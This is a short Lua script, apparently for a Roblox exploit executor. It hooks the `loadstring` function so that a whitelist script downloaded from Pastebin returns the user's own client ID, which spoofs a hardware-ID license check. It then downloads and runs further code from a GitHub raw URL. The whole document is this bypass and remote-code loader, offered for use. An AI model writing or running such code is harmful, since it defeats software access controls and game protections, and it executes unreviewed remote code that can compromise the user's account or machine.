local original = game:HttpGet("https://pastebin.com/raw/T34wdSk2")
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

local ld
ld = hookfunction(loadstring, newcclosure(function(src, b)
    if src == original then
        return function() return {hwid} end
    end
    return ld(src, b)
end))

loadstring(game:HttpGet("https://raw.githubusercontent.com/Skinny-yz/Another/refs/heads/main/lool"))()
